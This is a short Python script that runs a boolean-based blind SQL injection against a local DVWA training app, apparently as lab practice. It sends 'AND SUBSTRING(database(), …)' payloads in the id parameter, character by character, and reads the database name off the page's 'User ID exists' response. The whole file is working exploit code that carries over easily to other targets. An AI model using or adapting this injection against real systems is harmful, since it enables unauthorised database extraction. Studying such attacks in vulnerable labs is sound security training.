import requests as r

def intruder(Target, CookieId):
    Headers = {
        "Cookie" : CookieId,
        "User-Agent" : "Mozilla/5.0 (Intruder)"
    }

    Characters = "asdfghjklqwertyuiopzxcvbnm"
    extracted_data = ""
    for position in range(1,11):
        found_char = False
        for chr in Characters:
            payload = f"1' AND SUBSTRING(database(), {position}, 1)='{chr}' #"
            params = {
                "id" : payload,
                "Submit" : "Submit"
            }

            response = r.get(url=Target, headers=Headers,params=params)

            if "User ID exists in the database." in response.text:
                extracted_data += chr
                found_char = True
                break
        if not found_char:
            break
    print(f"DataBase Name is {extracted_data}")

if __name__ == "__main__":
    CookieId = "PHPSESSID=Your Cookie; security=low"
    Url = "http://localhost/DVWA-master/vulnerabilities/sqli_blind/"
    intruder(Url, CookieId)
